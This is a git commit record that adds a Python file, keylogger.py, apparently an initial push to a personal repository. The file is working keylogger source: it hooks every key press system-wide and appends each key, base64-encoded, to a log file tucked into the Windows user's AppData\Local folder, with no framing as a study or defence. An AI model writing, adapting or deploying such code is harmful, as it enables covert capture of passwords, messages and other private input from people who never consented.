6b8f6b4f114f25673e5b825d2110981f40c31971
0ddshell <oddshell@proton.me>
2025-04-22 15:09:47 +0200

    Initial Push

---
+++ keylogger.py
@@ -0,0 +1,25 @@
+import keyboard
+import os
+import base64
+
+#print(os.path.expanduser('~'))
+username = str(os.environ.get('USERNAME')) #get Username
+#print(type(username))
+
+path = "C:\\Users\\{}\\AppData\\Local\\keylogs.txt".format(username)
+#print(path)
+
+#log_file = "eylogs.txt"
+
+def keylogger(event):
+    with open(path, 'a') as f:
+        #f.write('{}\n'.format(event.name)) #This would save the keys in cleartext
+        key = str(event.name)
+        encoded = base64.b64encode(key.encode("UTF-8"))
+        f.write('{}\n'.format(encoded))
+
+keyboard.on_press(keylogger)
+keyboard.wait()
+
+#Adding Custom Lin
+#New Line for testing
